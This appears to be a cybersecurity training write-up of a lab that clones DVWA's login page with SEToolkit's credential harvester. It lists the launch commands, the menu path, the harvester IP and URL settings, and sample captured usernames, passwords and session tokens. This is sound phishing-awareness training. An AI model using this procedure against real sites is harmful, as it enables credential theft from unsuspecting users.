# 🔐 Website Cloning & Credential Harvesting Lab (Ethical Use)
## 📌 Overview

This lab demonstrates how website cloning and credential harvesting attacks work using SEToolkit (Social-Engineering Toolkit) in a controlled and ethical lab environment.
The goal of this exercise was educational — to understand how attackers exploit user trust and how defenders can better protect users and systems.

All testing was conducted against DVWA (Damn Vulnerable Web Application), which is intentionally insecure and designed for learning purposes.


## 🎯 Objectives

Understand how credential harvesting attacks are performed

Learn how attackers clone login pages

Analyze how captured credentials are stored and reported

Reinforce the importance of secure authentication and user awareness
---

## 🧪 Lab Environment

| Component   | Description                                   |
|------------|-----------------------------------------------|
| OS         | Kali Linux                                    |
| Tool       | SEToolkit                                     |
| Target     | DVWA (Damn Vulnerable Web Application)        |
| Attack Type| Credential Harvester – Site Cloner            |
| Purpose    | Learning & ethical cybersecurity training     |

---
## 🛠️ Tools Used

- SEToolkit – Social engineering framework
- Apache/Nginx – Web services used by SEToolkit
- DVWA – Vulnerable web application for testing
- Browser – To simulate victim interaction
---

## 🚀 Step-by-Step Procedure
### 1️⃣ Launch SEToolkit
```sudo su ```

```setoolkit```

- What this does:
Starts the Social-Engineering Toolkit with root privileges, which are required to run web services and network-based attacks.

### 2️⃣ Navigate Through SEToolkit Menus

Follow this menu path:

1) Social-Engineering Attacks
2) Web Attack Vectors
3) Credential Harvester Attack Method
2) Site Cloner


- What this does:

  - Enables a web-based attack

  - Selects credential harvesting

  - Uses the site cloner option to copy an existing website’s appearance

### 3️⃣ Set the Harvester IP Address
Enter the IP address for the POST back in Harvester/Tabnabbing: *10.6.6.1*


Explanation:
This is the IP address where stolen credentials will be sent.
In this lab, it was the attacker machine (Kali Linux) inside the lab network.

### 4️⃣ Specify the Website to Clone
Enter the url to clone: http://dvwa.vm


What this does:
SEToolkit clones the DVWA login page so it looks identical to the original site, tricking users into entering credentials.

### 5️⃣ Web Server Configuration

SEToolkit checks if port 80 is available and may prompt to stop Apache or Nginx:

`*Do you want to attempt to disable Apache? [y/n]: y*`


Why this happens:
SEToolkit needs port 80 to host the cloned website. Existing web services must be stopped to avoid conflicts.

---

## 📥 Credential Capture in Action

- Once the victim submits the login form:
- SEToolkit captures all POST data
- Credentials are displayed in the terminal
- A report is automatically generated

Example terminal output:
```
POSSIBLE USERNAME FIELD FOUND: username=trial@gmail.com
POSSIBLE PASSWORD FIELD FOUND: password=password01
```

📄 Viewing the Harvested Report

To view the saved credential report:

`cat /root/.set/reports/"2025-12-18 15:01:01.557900.xml"`


- What this does:
Displays the XML report containing:

  - Username

  - Password

  - Login action

  - Session token

Example output:
```
<harvester>
  <url>http://dvwa.vm</url>
  <url>
    <param>username=trial@gmail.com</param>
    <param>password=password01</param>
    <param>Login=Login</param>
    <param>user_token=761e39f0210a2b371ce36c91a4b68142</param>
  </url>
</harvester>
```
---

## 🔍 Key Observations

- Website cloning can look almost identical to the original site
- Users may unknowingly submit sensitive information
- Session tokens can also be captured, increasing attack impact
- This highlights the danger of phishing and fake login pages

🛡️ Defensive Takeaways

This lab emphasizes the importance of:

1. HTTPS and valid certificates
2. User education and phishing awareness
3. Strong authentication mechanisms
4. Monitoring suspicious POST requests
5. Regular security testing
---

## ⚠️ Ethical Disclaimer

This lab was performed strictly for educational purposes in a controlled environment using intentionally vulnerable systems.
Unauthorized testing or credential harvesting on real systems is illegal and unethical.

## 🙌 Acknowledgement

This hands-on exercise was conducted as part of cybersecurity training supported by **Parocyber**, focusing on practical skills and real-world attack awareness.

## 📚 Skills Gained

1. Social engineering awareness

2. Web attack analysis

3. Ethical hacking methodology

4. Incident detection understanding

5. Reporting and documentation
